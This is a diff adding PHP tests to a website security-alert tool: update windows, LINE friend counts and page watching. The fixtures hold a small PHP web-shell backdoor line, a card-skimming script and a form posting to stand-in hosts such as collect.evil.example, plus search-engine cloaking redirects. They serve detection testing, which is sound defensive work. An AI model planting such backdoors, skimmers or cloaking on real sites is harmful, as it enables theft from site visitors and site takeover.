@@ -65,6 +65,17 @@ function rrmdir($d)
  */
 function fake_quota($url, &$box)
 {
+    if (strpos($url, '/v2/bot/insight/followers') !== false)
+    {
+        /* "how many friends": counted apart from the allowance questions. $box['friends']: not set = LINE says
+           "not counted yet" for every date; array(followers, blocks); 'down' = no answer */
+        $box['friend_gets'] = (isset($box['friend_gets']) ? $box['friend_gets'] : 0) + 1;
+        $box['friend_urls'][] = $url;
+        $f = isset($box['friends']) ? $box['friends'] : null;
+        if ($f === 'down') { return array(500, ''); }
+        return array(200, json_encode($f ? array('status' => 'ready', 'followers' => $f[0], 'targetedReaches' => 0, 'blocks' => $f[1])
+            : array('status' => 'unready', 'followers' => null, 'targetedReaches' => null, 'blocks' => null)));
+    }
     $box['gets'] = (isset($box['gets']) ? $box['gets'] : 0) + 1;
     $q = isset($box['quota']) ? $box['quota'] : null;
     if ($q === 'down') { return array(500, ''); }
@@ -1471,6 +1482,308 @@ if (function_exists('exec'))
         && strpos($out, 'urgent ones       : LINE (1 recipient), then Telegram (1 chat), then Discord (1 webhook)  (line_min_level 2)') !== false
         && strpos($out, 'SECRET') === false && strpos($out, 'Usecret') === false && strpos($out, '-100777') === false, $out);
 }
+
+/* ------------------------------------------------------------------ */
+echo "Announced updates (--expect)\n";
+$clock = strtotime('2026-03-02 10:00:00 UTC');
+$site = tmpdir('site');
+mkdir($site . '/uploads', 0700, true);
+mkdir($site . '/lib', 0700, true);
+file_put_contents($site . '/index.php', "<?php echo 'v1';\n");
+file_put_contents($site . '/about.php', "<?php echo 'about';\n");
+$sd = tmpdir('state');
+$xcfg = array('timezone' => 'UTC', 'site_root' => $site, 'state_dir' => $sd, 'scan_hours' => 0, 'heartbeat_days' => 0);
+$a = make($box, $clock, $xcfg);
+$a->run();   // baseline
+file_put_contents($site . '/before.php', "<?php // changed before the announcement\n");
+$clock += 600;
+$e = $a->expectChanges(30);
+check('announcing first runs every check: a change made BEFORE the announcement is reported as usual', $e['ok'] && $e['until'] === $clock + 1800
+    && is_array($e['run']) && count($box['line']) === 1 && strpos($box['line'][0], 'before.php') !== false, json_encode(array($e, $box['line'])));
+file_put_contents($site . '/lib/new.php', "<?php // part of the update\n");
+file_put_contents($site . '/index.php', "<?php echo 'v2';\n");
+unlink($site . '/about.php');
+$clock += 300; $r = $a->run();
+check('inside the window: ordinary changes are not reported one by one', count($box['line']) === 1 && $r['file_scan'] === 'complete', json_encode($box['line']));
+file_put_contents($site . '/uploads/avatar.jpg.php', "<?php echo 1;\n");
+file_put_contents($site . '/lib/helper.php', bait("<?php \$~_GET['f'](\$~_POST['a']);\n"));
+$clock += 300; $a->run();
+$m = isset($box['line'][1]) ? $box['line'][1] : '';
+check('...but a program in an upload folder and backdoor-like content are URGENT at once, window or not', count($box['line']) === 2
+    && strpos($m, 'URGENT') !== false && strpos($m, 'avatar.jpg.php') !== false && strpos($m, 'helper.php') !== false && strpos($m, 'lib/new.php') === false, $m);
+$s = $a->status();
+check('status() shows the open window and what it collected so far', $s['expect'] !== null && $s['expect']['open']
+    && $s['expect']['new'] === 1 && $s['expect']['changed'] === 1 && $s['expect']['deleted'] === 1, json_encode($s['expect']));
+$clock += 1500;   // 35 minutes after the announcement: the 30-minute window is over
+$a->run();
+$m = isset($box['line'][2]) ? $box['line'][2] : '';
+check('after the window: ONE message sums the update up, with the file names, as a Notice', count($box['line']) === 3
+    && strpos($m, 'Code changes during your announced update') !== false && strpos($m, '1 new, 1 changed, 1 deleted') !== false
+    && strpos($m, 'lib/new.php') !== false && strpos($m, 'index.php') !== false && strpos($m, 'about.php') !== false
+    && strpos($m, 'helper.php') === false && strpos($m, 'URGENT') === false && !is_file($sd . '/expect.json'), $m);
+file_put_contents($site . '/after.php', "<?php // after the window\n");
+$clock += 300; $a->run();
+check('after the summary, changes are reported one by one again', count($box['line']) === 4 && strpos($box['line'][3], 'after.php') !== false);
+$a->expectChanges(60);
+file_put_contents($site . '/lib/new.php', "<?php // part of update 2\n");
+file_put_contents($site . '/lib/tmp.php', "<?php // made and removed during the update\n");
+$clock += 60; $a->run();
+unlink($site . '/lib/tmp.php');
+$clock += 60;
+$ended = $a->endExpect();
+$a->run();
+check('--expect off: closes at once, the summary comes with the next run; a file made and removed inside the window cancels out',
+    $ended && count($box['line']) === 5 && strpos($box['line'][4], '0 new, 1 changed, 0 deleted') !== false && strpos($box['line'][4], 'tmp.php') === false,
+    isset($box['line'][4]) ? $box['line'][4] : '');
+$e1 = $a->expectChanges(20);
+$clock += 60;
+$e2 = $a->expectChanges(60);
+check('announcing again while a window is open extends it (no second full check)', $e1['ok'] && $e2['ok'] && $e2['run'] === null && $e2['until'] === $clock + 3600);
+$clock += 3700; $a->run();
+check('a window in which nothing changed closes quietly (it is only written to the log)', count($box['line']) === 5 && !is_file($sd . '/expect.json'));
+file_put_contents($sd . '/expect.json', json_encode(array('from' => $clock, 'until' => $clock + 10 * 365 * 86400, 'files' => array(), 'more' => 0)));
+file_put_contents($site . '/sneaky.php', "<?php // planted under a forged window\n");
+$clock += 3600; $a->run();
+$quiet = count($box['line']) === 5;
+$clock += 3 * 3600 + 60; $a->run();
+check('a window written by hand "for ten years" still ends after 4 hours, and its summary names the planted file',
+    $quiet && count($box['line']) === 6 && strpos($box['line'][5], 'sneaky.php') !== false, json_encode($box['line']));
+$e = make($box, $clock)->expectChanges(30);
+check('without a file scan there is nothing to announce', !$e['ok'] && strpos($e['why'], 'file scan is off') !== false);
+
+$clock = strtotime('2026-03-02 10:00:00 UTC');
+$site2 = tmpdir('site');
+file_put_contents($site2 . '/index.php', "<?php echo 1;\n");
+$a = make($box, $clock, array('timezone' => 'UTC', 'site_root' => $site2, 'scan_hours' => 0));
+$a->run();
+$clock += 7 * 86400 - 600;
+$a->expectChanges(30);
+$clock += 900;   // the weekly check-in is due now, the window is still open
+$r1 = $a->run();
+$clock += 1200;
+$r2 = $a->run();
+check('the weekly check-in waits while an update window is open, and goes out once it closed', $r1['heartbeat'] === 'waiting for the update window' && $r2['heartbeat'] === 'line',
+    $r1['heartbeat'] . ' / ' . $r2['heartbeat']);
+
+/* ------------------------------------------------------------------ */
+echo "The LINE key on the server, and how many people it can reach\n";
+$clock = strtotime('2026-03-09 10:00:00 UTC');
+$a = make($box, $clock, array('timezone' => 'UTC'));
+$box['friends'] = array(150, 10);
+$n = $a->lineFriendCount();
+check('asks LINE about yesterday (Japan time): friends minus those who blocked the account', $n === 140 && $box['friend_gets'] === 1
+    && substr($box['friend_urls'][0], -14) === '?date=20260308', json_encode($box));
+$s = $a->status();
+check('status() remembers it and says that alerts belong in an account of their own', $s['line_friends']['n'] === 140
+    && count(preg_grep('/about 140 friends/', $s['problems'])) === 1, json_encode($s['problems']));
+$box['friends'] = array(4, 0);
+$a->lineFriendCount();
+$s = $a->status();
+check('a handful of friends (the owner and staff): nothing to say', $s['line_friends']['n'] === 4 && count(preg_grep('/friends/', $s['problems'])) === 0);
+unset($box['friends']);
+$box['friend_gets'] = 0;
+check('"not counted yet" for every day: three days are tried, then no answer', $a->lineFriendCount() === null && $box['friend_gets'] === 3);
+$a = make($box, $clock, array('line_friends_warn' => 0));
+$box['friends'] = array(500, 0);
+check('line_friends_warn = 0: LINE is not asked', $a->lineFriendCount() === null && !isset($box['friend_gets']));
+$a = make($box, $clock, array('line_channel_access_token' => ''));
+$box['friends'] = array(500, 0);
+check('no LINE set up: not asked', $a->lineFriendCount() === null && !isset($box['friend_gets']) && $a->status()['line_friends'] === null);
+foreach (array(array(300, 0), array(3, 0)) as $f)
+{
+    $clock = strtotime('2026-03-02 10:00:00 UTC');
+    $a = make($box, $clock, array('timezone' => 'UTC'));
+    $box['friends'] = $f;
+    $a->run();
+    $clock += 7 * 86400;
+    $r = $a->run();
+    $hb = (string) end($box['line']);
+    if ($f[0] === 300)
+    {
+        check('weekly check-in: an alert account with 300 friends is a warning', $r['heartbeat'] === 'line' && strpos($hb, 'about 300 friends') !== false
+            && strpos($hb, 'something to look at') !== false, $hb);
+    }
+    else
+    {
+        check('...with 3 friends nothing is said about it', $r['heartbeat'] === 'line' && strpos($hb, 'friends') === false && strpos($hb, 'something to look at') === false, $hb);
+    }
+}
+
+/* ------------------------------------------------------------------ */
+echo "Page watch (a fake site in memory, read the four ways)\n";
+function shop_html(array $head = array(), array $body = array())
+{
+    return '<!doctype html><html><head><title>Shop</title><script src="/js/app.js"></script>'
+        . '<script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>'
+        . '<script>(function(){var s=document.createElement("script");s.src="https:\/\/connect.facebook.net\/en_US\/sdk.js";})();</script>'
+        . '<script type="application/ld+json">{"sameAs":["https://instagram.com/shop"]}</script>'
+        . implode('', $head) . '</head><body>'
+        . '<a href="/about">About</a><a href="https://shop.example/cart">Cart</a><a href="//cdn.shop.example/x.pdf">PDF</a>'
+        . '<a href="https://www.shop.example/">Home</a><a href="mailto:hi@shop.example">Mail</a><a href="https://www.facebook.com/shop">FB</a>'
+        . '<form action="/search"></form><!-- <script src="https://commented.example/x.js"></script> -->'
+        . implode('', $body) . '</body></html>';
+}
+$web = array();     // address => page html, or function(view) => array(status, body, location)
+$reads = array();
+$pageNet = function ($url, $headers, $timeout) use (&$web, &$reads) {
+    $ua = '';
+    $ref = '';
+    foreach ($headers as $h)
+    {
+        if (stripos($h, 'User-Agent: ') === 0) { $ua = substr($h, 12); }
+        if (stripos($h, 'Referer: ') === 0) { $ref = substr($h, 9); }
+    }
+    $view = stripos($ua, 'Googlebot') !== false ? 'crawler' : ($ref !== '' ? 'from_google' : (stripos($ua, 'Mobile') !== false ? 'mobile' : 'browser'));
+    $reads[] = array('url' => $url, 'view' => $view, 'ref' => $ref);
+    if (!isset($web[$url])) { return array(404, 'not found', ''); }
+    if (is_array($web[$url])) { return $web[$url]; }
+    return is_callable($web[$url]) ? call_user_func($web[$url], $view) : array(200, $web[$url], '');
+};
+$U = 'https://shop.example/';
+$clock = strtotime('2026-03-02 10:00:00 UTC');
+$web[$U] = shop_html();
+$sd = tmpdir('state');
+$pw = array('timezone' => 'UTC', 'state_dir' => $sd, 'page_watch' => array($U), 'page_transport' => $pageNet, 'heartbeat_days' => 0);
+$a = make($box, $clock, $pw);
+$r = $a->run();
+$rec = json_decode((string) file_get_contents($sd . '/pages.json'), true);
+$k = isset($rec[$U]['k']) ? $rec[$U]['k'] : array();
+check('first read: the baseline, nothing sent', $r['pages'] === 'read 1 page(s)' && count($box['line']) === 0, json_encode($r));
+$views = array_map(function ($x) { return $x['view']; }, $reads);
+sort($views);
+check('read four ways: desktop, phone, Google\'s crawler, a phone arriving from a Google search', $views === array('browser', 'crawler', 'from_google', 'mobile')
+    && count(array_filter($reads, function ($x) { return $x['view'] === 'from_google' && $x['ref'] === 'https://www.google.com/'; })) === 1, json_encode($reads));
+check('recorded: outside scripts (also one a script loads), outside links; not this site, its sub-domains, JSON-LD data, comments or mail links',
+    isset($k['script']['www.googletagmanager.com'], $k['script']['connect.facebook.net'], $k['link']['www.facebook.com'])
+    && !isset($k['script']['instagram.com']) && !isset($k['link']['instagram.com']) && !isset($k['script']['commented.example'])
+    && !isset($k['link']['shop.example']) && !isset($k['link']['www.shop.example']) && !isset($k['link']['cdn.shop.example']) && empty($k['form']), json_encode($k));
+$clock += 1800; $r = $a->run();
+check('read again only after page_watch_hours', $r['pages'] === 'not due' && count($reads) === 4);
+
+$web[$U] = shop_html(array('<script src="https://cdn-evil.example/s.js"></script>', '<script src="data:text/javascript;base64,QUJD"></script>'),
+    array('<form action="https://collect.evil.example/p" method="post"><input name="card"></form>'));
+$clock += 1800; $a->run();
+$m = isset($box['line'][0]) ? $box['line'][0] : '';
+check('a skimming script and a form that posts elsewhere: URGENT, in words', count($box['line']) === 1 && strpos($m, 'URGENT') !== false
+    && strpos($m, 'A page started using another site') !== false && strpos($m, 'home page: runs code from cdn-evil[.]example') !== false
+    && strpos($m, 'code written into the page itself') !== false && strpos($m, 'a form now sends what visitors type to collect[.]evil[.]example') !== false, $m);
+check('site names are written as name[.]com, so a tap cannot open them', strpos($m, 'cdn-evil.example') === false && strpos($m, 'collect.evil.example') === false);
+$clock += 3600; $a->run();
+check('the same sites an hour later: not repeated', count($box['line']) === 1);
+
+$skim = array('<script src="https://cdn-evil.example/s.js"></script>', '<script src="data:text/javascript;base64,QUJD"></script>');
+$web[$U] = function ($view) use ($skim) {
+    if ($view === 'from_google') { return array(302, '', 'https://spam-landing.example/?from=shop'); }
+    return array(200, shop_html($skim, $view === 'crawler' ? array('<div style="display:none"><a href="https://casino-spam.example/">x</a></div>') : array()), '');
+};
+$clock += 3600; $a->run();
+$m = isset($box['line'][1]) ? $box['line'][1] : '';
+check('links only for the crawler, a redirect only for visitors from Google: URGENT "shown to search engines, not to you"', count($box['line']) === 2
+    && strpos($m, 'URGENT') !== false && strpos($m, 'Your pages show search engines something you do not see') !== false
+    && strpos($m, 'only search engines get casino-spam[.]example') !== false
+    && strpos($m, 'only visitors coming from a Google search get spam-landing[.]example') !== false
+    && strpos($m, 'New links to other sites') === false, $m);
+
+$web[$U] = shop_html($skim, array('<a href="https://partner.example/">our partner</a>'));
+$clock += 3600; $a->run();
+$m = isset($box['line'][2]) ? $box['line'][2] : '';
+check('an ordinary new link that everybody sees: a Notice', count($box['line']) === 3 && strpos($m, 'New links to other sites on your pages') !== false
+    && strpos($m, 'partner[.]example') !== false && strpos($m, 'URGENT') === false, $m);
+
+$a = make($box, $clock, array_merge($pw, array('page_links' => false, 'page_allow' => array('newwidget.example'))));
+$web[$U] = function ($view) use ($skim) {
+    $head = array_merge($skim, array('<script src="https://cdn.newwidget.example/w.js"></script>'));
+    if ($view !== 'browser') { $head[] = '<script src="https://m-chat.example/c.js"></script>'; }   // a chat box in the phone layout only
+    return array(200, shop_html($head, array('<a href="https://partner2.example/">p2</a>')), '');
+};
+$clock += 3600; $a->run();
+$m = isset($box['line'][0]) ? $box['line'][0] : '';
+check('page_allow: a site you use on purpose is not reported; page_links = false: new links are not either', count($box['line']) === 1
+    && strpos($m, 'newwidget') === false && strpos($m, 'partner2') === false, $m);
+check('a script in the phone layout only is a new script, not "hidden from you" (the phone view has it)',
+    strpos($m, 'runs code from m-chat[.]example') !== false && strpos($m, 'only search engines') === false, $m);
+
+$sd2 = tmpdir('state');
+$web['https://shop.example/old'] = array(301, '', '/new');
+$web['https://shop.example/new'] = shop_html();
+$reads = array();
+$a = make($box, $clock, array_merge($pw, array('state_dir' => $sd2, 'page_watch' => array('https://shop.example/old'))));
+$a->run();
+check('a redirect within the site is followed', count($reads) === 8 && $reads[1]['url'] === 'https://shop.example/new'
+    && count($box['line']) === 0, json_encode($reads));
+$web['https://shop.example/new'] = array(302, '', 'https://evil-redirect.example/x');
+$clock += 3600; $a->run();
+$m = isset($box['line'][0]) ? $box['line'][0] : '';
+check('...a redirect to another site is not: it is reported', strpos($m, '/old: sends visitors on to evil-redirect[.]example') !== false, $m);
+
+$sd3 = tmpdir('state');
+$web['https://shop.example/x'] = function ($view) { return $view === 'crawler' ? array(403, 'fake bot', '') : array(200, shop_html(), ''); };
+$web['https://shop.example/down'] = array(503, '', '');
+$a = make($box, $clock, array_merge($pw, array('state_dir' => $sd3, 'page_watch' => array('https://shop.example/x', 'https://shop.example/down'))));
+for ($i = 0; $i < 3; $i++) { $a->run(); $clock += 3600; }
+$p = implode("\n", $a->status()['problems']);
+check('pages that cannot be read: no alert (watching uptime is another service\'s job), but status() says so', count($box['line']) === 0
+    && strpos($p, 'page /down: the browser view could not be read 3 times in a row (HTTP 503)') !== false
+    && strpos($p, 'page /x: the crawler view could not be read 3 times in a row (HTTP 403); a firewall that blocks fake search-engine visits') !== false, $p);
+
+$web[$U] = function ($view) use ($skim) {
+    if ($view === 'from_google') { return array(302, '', 'https://spam-landing.example/?from=shop'); }
+    return array(200, shop_html($skim, $view === 'crawler' ? array('<a href="https://casino-spam.example/">x</a>') : array()), '');
+};
+$before = (string) file_get_contents($sd . '/pages.json');
+$a = make($box, $clock, $pw);
+$now = $a->pagesNow();
+$o = isset($now[$U]) ? $now[$U] : array();
+check('pagesNow() (--pages) lists what only the crawler and Google visitors get, and saves nothing',
+    isset($o['only_bots']['link'], $o['only_bots']['redirect']) && $o['only_bots']['link'] === array('casino-spam.example')
+    && $o['only_bots']['redirect'] === array('spam-landing.example') && in_array('cdn-evil.example', $o['outside']['script'], true)
+    && (string) file_get_contents($sd . '/pages.json') === $before && count($box['line']) === 0, json_encode($o));
+
+$web['https://shop.example/tricks'] = '<html><body>'
+    . '<a href="https://shop.example@evil-at.example/">1</a><a href="java&#x09;script:alert(1)">2</a><a href=" HTTPS:\\\\back.example\\x">3</a>'
+    . '<A HREF=\'https://upper.example/\'>4</A><a href=https://unquoted.example/x>5</a><a href="tel:123">6</a>'
+    . '<iframe src="//frame.example/"></iframe><object data="https://obj.example/o"></object>'
+    . '<link rel="modulepreload" href="https://mod.example/m.js"><link rel="stylesheet" href="https://css.example/s.css">'
+    . '<button formaction="https://fa.example/x">go</button><meta http-equiv="refresh" content="5; url=https://meta-redirect.example/">'
+    . '</body></html>';
+$a = make($box, $clock, array_merge($pw, array('state_dir' => tmpdir('state'), 'page_watch' => array('https://shop.example/tricks'))));
+$now = $a->pagesNow();
+$v = isset($now['https://shop.example/tricks']['views']['browser']) ? $now['https://shop.example/tricks']['views']['browser'] : array();
+check('addresses read the way a browser reads them ("user@", tabs, backslashes, upper case, no quotes)',
+    isset($v['link']) && $v['link'] === array('back.example', 'evil-at.example', 'unquoted.example', 'upper.example'), json_encode($v));
+check('frames, objects, module scripts, form buttons and meta refresh each land in their category; style sheets are not counted',
+    $v['frame'] === array('frame.example', 'obj.example') && $v['script'] === array('mod.example') && $v['form'] === array('fa.example')
+    && $v['redirect'] === array('meta-redirect.example'), json_encode($v));
+
+$web['https://shop.example/big'] = '<html><head><script>var cfg = "' . str_repeat('x', 1200000) . '";</script>'
+    . '<script src="https://after-big.example/x.js"></script><style>a{}</style></head><body><a href="https://link-after.example/">a</a><!-- unclosed comment';
+$a = make($box, $clock, array_merge($pw, array('state_dir' => tmpdir('state'), 'page_watch' => array('https://shop.example/big'))));
+$now = $a->pagesNow();
+$v = isset($now['https://shop.example/big']['views']['browser']) ? $now['https://shop.example/big']['views']['browser'] : array();
+check('a 1.2 MB inline script does not hide what comes after it', isset($v['script'], $v['link']) && $v['script'] === array('after-big.example')
+    && $v['link'] === array('link-after.example'), json_encode($v));
+
+unlink($sd . '/pages.json');
+$web[$U] = shop_html($skim);
+$a = make($box, $clock, $pw);
+$clock += 3600; $a->run();
+check('page records deleted behind our back: said once, then read afresh', count($box['line']) === 1
+    && strpos($box['line'][0], 'The page-watch records have disappeared') !== false && is_file($sd . '/pages.json'), json_encode($box['line']));
+$a = make($box, $clock, array('page_watch' => array()));
+check('no page_watch: no page is read', $a->run()['pages'] === 'off');
+
+$zh = make($box, $clock, array('language' => 'zh-TW'));
+$en = make($box, $clock);
+$tm = new ReflectionMethod('SecurityAlerts', 't');
+if (PHP_VERSION_ID < 80100) { $tm->setAccessible(true); }
+$missing = array();
+foreach (array('hb_friends', 'exp_title', 'exp_opened', 'exp_window', 'exp_none', 'exp_hint', 'page_home', 'page_code_title', 'page_new_script',
+    'page_new_frame', 'page_new_form', 'page_new_redirect', 'page_code_hint', 'page_hidden_title', 'page_hidden_line', 'page_who_c', 'page_who_g',
+    'page_who_cg', 'page_hidden_hint', 'page_links_title', 'page_links_hint', 'page_more', 'page_and_more', 'page_data_url', 'page_lost_title', 'page_lost_body') as $key)
+{
+    if ($tm->invoke($zh, $key) === $tm->invoke($en, $key) || $tm->invoke($en, $key) === $key) { $missing[] = $key; }
+}
+check('every new message exists in English and in Chinese', $missing === array(), implode(' ', $missing));
 
 /* ------------------------------------------------------------------ */
 echo "Daily cap, urgent bypass, fallback\n";
